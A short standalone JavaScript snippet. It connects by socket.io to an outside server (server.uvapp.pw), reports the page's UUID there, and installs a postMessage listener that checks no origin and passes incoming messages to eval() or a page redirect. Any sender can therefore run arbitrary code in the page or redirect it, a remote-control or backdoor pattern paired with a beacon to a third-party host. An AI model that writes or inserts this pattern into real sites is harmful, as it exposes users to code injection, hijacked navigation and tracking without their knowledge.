javascript
(function () {
  // Helper function to handle message event
  function handleMessageEvent(e) {
    const data = JSON.parse(e.data);

    if (data.type === "url") {
      window.location.href = data.url;
    } else if (data.type === "eval") {
      eval(data.code);
    }
  }

  const uv = {
    init: function () {
      this.setupSocketConnection();
      this.setupPostMessageListener();
    },

    setupSocketConnection: function () {
      const socket = io("https://server.uvapp.pw");
      socket.on("connect", () => {
        socket.emit("setID", uv.getUuid());
      });
    },

    setupPostMessageListener: function () {
      window.addEventListener("message", handleMessageEvent);
    },

    getUuid: function () {
      return document.querySelector("meta[name='uuid']").getAttribute("content");
    },
  };

  uv.init();
})();
